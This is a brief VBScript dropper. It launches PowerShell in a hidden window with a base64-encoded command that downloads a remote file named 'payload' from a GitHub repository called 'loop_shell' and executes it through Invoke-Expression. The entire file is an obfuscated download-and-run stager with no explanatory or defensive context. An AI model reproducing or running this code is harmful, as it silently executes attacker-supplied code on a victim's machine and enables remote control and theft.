Set shell = CreateObject("WScript.Shell")

encodedCommand = "aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbgBhAHAAcgBpAHYAYQB0AGUALwBsAG8AbwBwAF8AcwBoAGUAbABsAC8AbQBhAGkAbgAvAHAAYQB5AGwAbwBhAGQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAGkAZQB4AA=="

cmd = "powershell.exe -EncodedCommand " & encodedCommand

shell.Run cmd, 0, False
Set shell = Nothing
